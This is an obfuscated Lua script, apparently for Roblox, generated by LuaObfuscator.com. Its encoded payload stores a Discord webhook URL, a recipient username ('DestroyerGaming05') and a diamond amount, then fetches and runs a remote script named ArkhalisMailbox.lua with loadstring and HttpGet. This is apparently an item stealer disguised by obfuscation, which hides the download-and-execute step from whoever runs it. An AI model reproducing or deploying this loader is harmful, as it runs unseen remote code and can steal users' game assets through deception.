--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v82=v2(v0(v30,16));if v19 then local v88=0;local v89;while true do if (v88==0) then v89=v5(v82,v19);v19=nil;v88=1;end if (v88==1) then return v89;end end else return v82;end end end);local function v20(v31,v32,v33)if v33 then local v83=(v31/((5 -3)^(v32-(2 -1))))%(((1 + 2) -1)^(((v33-1) -(v32-1)) + (2 -(1 + 0)))) ;return v83-(v83%(620 -(555 + 64))) ;else local v84=(933 -(857 + 74))^(v32-(569 -(367 + 201))) ;return (((v31%(v84 + v84))>=v84) and (928 -((1091 -(282 + 595)) + 713))) or 0 ;end end local function v21()local v34=1637 -(1523 + 114) ;local v35;while true do if (v34==((4 -3) + (117 -(32 + 85)))) then return v35;end if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + (1066 -(68 + 997)) ;v34=1271 -(226 + 1044) ;end end end local function v22()local v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 1 + 1 ;return (v37 * (1213 -(892 + 65))) + v36 ;end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + (9 -5) ;return (v41 * (31011612 -14234396)) + (v40 * (120312 -54776)) + (v39 * (606 -((267 -(67 + 113)) + 193 + 70))) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=1 + 0 ;local v45=(v20(v43,(2 + 0) -(3 -2) ,15 + (17 -12) ) * ((7 -5)^(984 -(802 + 150)))) + v42 ;local v46=v20(v43,56 -(894 -(814 + 45)) ,31);local v47=((v20(v43,57 -25 )==(1 + 0)) and  -(998 -(915 + 82))) or ((4 -2) -1) ;if (v46==(0 + 0)) then if (v45==(0 -0)) then return v47 * (438 -(145 + 293)) ;else v46=431 -(44 + 386) ;v44=1486 -(998 + 488) ;end elseif (v46==(3234 -(1069 + 118))) then return ((v45==(0 -0)) and (v47 * (((42 + 731) -(201 + 571))/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-(2161 -(116 + 1022)) ) * (v44 + (v45/((1 + 1)^(92 -40)))) ;end local function v25(v48)local v49=0 + (766 -(745 + 21)) ;local v50;local v51;while true do if (v49==(886 -(261 + 624))) then v50=v3(v16,v18,(v18 + v48) -(1 -0) );v18=v18 + v48 ;v49=1082 -(351 + 669 + 60) ;end if (v49==(1425 -(630 + 793))) then v51={};for v90=3 -2 , #v50 do v51[v90]=v2(v1(v3(v50,v90,v90)));end v49=14 -11 ;end if (v49==(0 + 0)) then v50=nil;if  not v48 then local v96=0 -0 ;while true do if (v96==(0 -0)) then v48=v23();if (v48==(1747 -(760 + (3871 -2884)))) then return "";end break;end end end v49=1;end if ((1916 -(1789 + 124))==v49) then return v6(v51);end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v52~=(12 -8)) then else v61=nil;while true do if (2==v53) then local v97=0 + 0 ;while true do if (v97~=(1 + 0)) then else v53=1 + 2 ;break;end if (v97~=(1171 -(418 + 753))) then else v58=nil;v59=nil;v97=1;end end end if (v53==1) then local v98=0;while true do if (v98~=(1 + 0)) then else v53=1 + 1 ;break;end if (v98==(0 + 0)) then v56=nil;v57=nil;v98=1 + 0 ;end end end if (v53==0) then v54=529 -(406 + 123) ;v55=nil;v53=1;end if (v53~=3) then else v60=nil;v61=nil;v53=4;end if (v53==(1773 -(1749 + 20))) then while true do if (v54==1) then local v106=0 + 0 ;while true do if (v106==(1322 -(1249 + 73))) then v57=nil;v58=nil;v106=1;end if (v106~=1) then else v54=2;break;end end end if (v54==(0 + 0)) then local v107=1145 -(466 + 679) ;local v108;while true do if ((0 -0)==v107) then v108=0 -0 ;while true do if (v108==0) then local v177=1900 -(106 + 1794) ;while true do if (v177==1) then v108=1 + 0 ;break;end if (v177~=(0 + 0)) then else v55=0;v56=nil;v177=1;end end end if (v108~=(2 -1)) then else v54=1;break;end end break;end end end if (2~=v54) then else v59=nil;v60=nil;v54=3;end if (v54==(7 -4)) then v61=nil;while true do local v109=0;local v110;while true do if (v109==(114 -(4 + 110))) then v110=0;while true do if (v110~=0) then else local v178=584 -(57 + 527) ;local v179;while true do if (v178~=0) then else v179=0;while true do if (v179==(1427 -(41 + 1386))) then if (v55==(104 -(17 + 86))) then local v182=0;local v183;while true do if (v182~=(0 + 0)) then else v183=0 -0 ;while true do if ((2 -1)==v183) then local v190=166 -(122 + 44) ;while true do if (v190==1) then v183=2;break;end if (v190~=0) then else for v194=1,v60 do local v195=0;local v196;local v197;while true do if (v195~=0) then else local v200=0;while true do if (v200~=(0 -0)) then else v196=v21();v197=nil;v200=3 -2 ;end if (v200~=1) then else v195=1 + 0 ;break;end end end if (v195~=(1 + 0)) then else if (v196==(1 -0)) then v197=v21()~=(65 -(30 + 35)) ;elseif (v196==(2 + 0)) then v197=v24();elseif (v196~=(1260 -(1043 + 214))) then else v197=v25();end v61[v194]=v197;break;end end end v59[11 -8 ]=v21();v190=1;end end end if (v183==2) then v55=2;break;end if (v183==0) then v60=v23();v61={};v183=1;end end break;end end end if ((1214 -(323 + 889))==v55) then local v184=0 -0 ;local v185;local v186;while true do if (v184~=(581 -(361 + 219))) then else while true do if (v185~=(320 -(53 + 267))) then else v186=0;while true do local v192=0;while true do if ((0 + 0)==v192) then if (v186==(414 -(15 + 398))) then return v59;end if (v186==0) then local v198=0;local v199;while true do if (v198~=0) then else v199=982 -(18 + 964) ;while true do if (v199==0) then for v202=3 -2 ,v23() do local v203=0;local v204;while true do if (v203==(0 + 0)) then v204=v21();if (v20(v204,1 + 0 ,1)==0) then local v207=850 -(20 + 830) ;local v208;local v209;local v210;local v211;while true do if (v207==(2 + 0)) then while true do if (v208==1) then local v214=0;local v215;local v216;while true do if (v214==(126 -(116 + 10))) then v215=0 + 0 ;v216=nil;v214=1;end if (v214==(739 -(542 + 196))) then while true do if (v215==(0 -0)) then v216=0;while true do if (v216==1) then v208=1 + 1 ;break;end if (v216==0) then local v228=0;while true do if (v228~=(1 + 0)) then else v216=1 + 0 ;break;end if (v228==0) then v211={v22(),v22(),nil,nil};if (v209==(0 -0)) then local v231=0;while true do if (v231~=(1551 -(1126 + 425))) then else v211[408 -(118 + 287) ]=v22();v211[15 -11 ]=v22();break;end end elseif (v209==1) then v211[3]=v23();elseif (v209==(1123 -(118 + 1003))) then v211[3]=v23() -(2^(46 -30)) ;elseif (v209~=(380 -(142 + 235))) then else local v240=0 -0 ;local v241;while true do if (v240~=(0 + 0)) then else v241=0;while true do if (v241~=0) then else v211[3]=v23() -((979 -(553 + 424))^16) ;v211[7 -3 ]=v22();break;end end break;end end end v228=1 + 0 ;end end end end break;end end break;end end end if (v208==2) then local v217=0;local v218;while true do if (v217==0) then v218=0 + 0 ;while true do if ((1 + 0)~=v218) then else v208=2 + 1 ;break;end if (v218~=(0 + 0)) then else local v225=0 -0 ;while true do if (v225==(2 -1)) then v218=2 -1 ;break;end if (v225==0) then local v229=0;while true do if (v229~=(1 + 0)) then else v225=4 -3 ;break;end if (v229~=0) then else if (v20(v210,754 -(239 + 514) ,1 + 0 )==1) then v211[2]=v61[v211[1331 -(797 + 532) ]];end if (v20(v210,2 + 0 ,1 + 1 )==(2 -1)) then v211[1205 -(373 + 829) ]=v61[v211[734 -(476 + 255) ]];end v229=1;end end end end end end break;end end end if (v208==0) then local v219=1130 -(369 + 761) ;local v220;while true do if (v219==0) then v220=0;while true do if (v220==(1 + 0)) then v208=1;break;end if (v220~=0) then else local v226=0 -0 ;local v227;while true do if (v226~=(0 -0)) then else v227=0;while true do if (v227==0) then local v230=238 -(64 + 174) ;while true do if (v230==(1 + 0)) then v227=1;break;end if (v230==(0 -0)) then v209=v20(v204,2,339 -(144 + 192) );v210=v20(v204,4,222 -(42 + 174) );v230=1;end end end if (v227~=(1 + 0)) then else v220=1;break;end end break;end end end end break;end end end if (v208==3) then if (v20(v210,3,3 + 0 )==(1 + 0)) then v211[1508 -(363 + 1141) ]=v61[v211[1584 -(1183 + 397) ]];end v56[v202]=v211;break;end end break;end if (v207~=1) then else v210=nil;v211=nil;v207=5 -3 ;end if ((0 + 0)==v207) then local v212=0 + 0 ;local v213;while true do if (v212==0) then v213=1975 -(1913 + 62) ;while true do if (v213==1) then v207=1;break;end if (v213~=0) then else local v224=0 + 0 ;while true do if (0==v224) then v208=0;v209=nil;v224=1;end if ((2 -1)==v224) then v213=1934 -(565 + 1368) ;break;end end end end break;end end end end end break;end end end for v205=3 -2 ,v23() do v57[v205-1 ]=v28();end v199=1;end if (v199==(1662 -(1477 + 184))) then v186=1;break;end end break;end end end break;end end end break;end end break;end if (0==v184) then v185=0 -0 ;v186=nil;v184=1 + 0 ;end end end v179=1;end if (v179~=1) then else v110=857 -(564 + 292) ;break;end end break;end end end if (v110~=(1 -0)) then else if (v55==0) then local v180=0 -0 ;local v181;while true do if (v180~=(304 -(244 + 60))) then else v181=0 + 0 ;while true do if (v181==(477 -(41 + 435))) then local v187=0;while true do if (v187==(1001 -(938 + 63))) then v58={};v59={v56,v57,nil,v58};v187=1 + 0 ;end if (v187==(1614 -(1565 + 48))) then v181=2;break;end end end if (v181==(2 + 0)) then v55=1139 -(782 + 356) ;break;end if (v181==(267 -(176 + 91))) then local v188=0 -0 ;local v189;while true do if ((0 -0)==v188) then v189=1092 -(975 + 117) ;while true do if (v189~=(1876 -(157 + 1718))) then else v181=1 + 0 ;break;end if (v189~=(0 -0)) then else local v191=0 -0 ;while true do if (v191==1) then v189=1;break;end if (v191==(1018 -(697 + 321))) then v56={};v57={};v191=1;end end end end break;end end end end break;end end end break;end end break;end end end break;end end break;end end break;end if (v52==(2 -1)) then v55=nil;v56=nil;v52=2;end if (v52==(5 -2)) then v59=nil;v60=nil;v52=4;end if ((0 -0)==v52) then v53=0 + 0 ;v54=nil;v52=1 -0 ;end if (v52==2) then v57=nil;v58=nil;v52=3;end end end local function v29(v62,v63,v64)local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...)local v68=v65;local v69=v66;local v70=v67;local v71=v27;local v72=1;local v73= -1;local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v85=0,v76 do if (v85>=v70) then v74[v85-v70 ]=v75[v85 + 1 ];else v78[v85]=v75[v85 + 1 ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do v80=v68[v72];v81=v80[1];if (v81<=5) then if (v81<=2) then if (v81<=0) then local v99=0;local v100;local v101;local v102;local v103;local v104;while true do if (v99==3) then v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v104=v80[2];v101,v102=v71(v78[v104](v13(v78,v104 + 1 ,v80[3])));v99=4;end if (v99==4) then v73=(v102 + v104) -1 ;v100=0;for v151=v104,v73 do v100=v100 + 1 ;v78[v151]=v101[v100];end v72=v72 + 1 ;v80=v68[v72];v104=v80[2];v99=5;end if (v99==5) then v78[v104]=v78[v104](v13(v78,v104 + 1 ,v73));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]();v72=v72 + 1 ;v80=v68[v72];v99=6;end if (6==v99) then v72=v80[3];break;end if (2==v99) then v80=v68[v72];v104=v80[2];v103=v78[v80[3]];v78[v104 + 1 ]=v103;v78[v104]=v103[v80[4]];v72=v72 + 1 ;v99=3;end if (1==v99) then v80=v68[v72];v78[v80[2]]=v64[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v64[v80[3]];v72=v72 + 1 ;v99=2;end if (v99==0) then v100=nil;v101,v102=nil;v103=nil;v104=nil;v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v99=1;end end elseif (v81==1) then v78[v80[2]]=v64[v80[3]];elseif (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=3) then v72=v80[3];elseif (v81==4) then do return;end else v78[v80[2]][v80[3]]=v80[4];end elseif (v81<=8) then if (v81<=6) then v78[v80[2]]();elseif (v81==7) then local v115=0;local v116;while true do if (v115==0) then v116=v80[2];v78[v116]=v78[v116](v13(v78,v116 + 1 ,v73));break;end end else local v117=0;local v118;local v119;while true do if (v117==1) then v78[v118 + 1 ]=v119;v78[v118]=v119[v80[4]];break;end if (v117==0) then v118=v80[2];v119=v78[v80[3]];v117=1;end end end elseif (v81<=10) then if (v81>9) then local v120=0;while true do if (v120==0) then v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v120=1;end if (4==v120) then v72=v80[3];break;end if (v120==3) then v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v120=4;end if (v120==2) then v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v120=3;end if (v120==1) then v78[v80[2]]=v64[v80[3]];v72=v72 + 1 ;v80=v68[v72];v120=2;end end else v78[v80[2]]=v80[3];end elseif (v81>11) then for v147=v80[2],v80[3] do v78[v147]=nil;end else local v123=v80[2];local v124,v125=v71(v78[v123](v13(v78,v123 + 1 ,v80[3])));v73=(v125 + v123) -1 ;local v126=0;for v149=v123,v73 do local v150=0;while true do if (v150==0) then v126=v126 + 1 ;v78[v149]=v124[v126];break;end end end end v72=v72 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O313039303437383435382O393734373332382F39375A473679304361596B3479674D614279446D4C5762644846547353326B6F71315263464259457562426B49456A3952706E765F58734953574C6733694F7039385349030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756103083O00557365726E616D6503113O0044657374726F79657247616D696E67303503083O004469616D6F6E6473024O0080841E41001C3O0012093O00014O000C000100013O0026023O0002000100010004033O00020001001209000100013O00260200010011000100020004033O00110001001201000200033O00302O00020004000500122O000200063O00122O000300073O00202O00030003000800122O000500096O000300056O00023O00024O00020001000100044O001B000100260200010005000100010004033O00050001001201000200033O00300A0002000A000B00122O000200033O00302O0002000C000D00122O000100023O00044O000500010004033O001B00010004033O000200012O00043O00017O00",v9(),...);end
